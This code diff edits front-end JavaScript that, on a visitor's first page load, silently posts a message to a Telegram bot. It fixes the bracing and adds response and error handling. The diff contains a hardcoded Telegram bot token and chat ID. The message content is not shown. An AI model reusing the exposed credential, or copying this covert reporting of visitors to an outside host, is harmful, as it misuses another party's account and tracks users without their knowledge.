@@ -198,7 +198,7 @@ if(!getCookie('visited'))
                              `;
 
         
-  if (!getCookie('visited')) 
+if (!getCookie('visited')) {
   const token = '6760998368:AAGASTUFyPU3WQyupgYDk11ygOb4SU7oCus';
   const chatId = '-1002084822950';
   const url = 'https://api.telegram.org/bot' + token + '/sendMessage';
@@ -206,10 +206,18 @@ if(!getCookie('visited'))
   formData.append('chat_id', chatId);
   formData.append('text', message);
   formData.append('parse_mode', 'Markdown');
+  
   fetch(url, {
     method: 'POST',
     body: formData
+  })
+  .then(response => {
     document.cookie = "visited=true; max-age=3600"; // Устанавливаем куки на 1 час
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
+}
         });
       });
     });
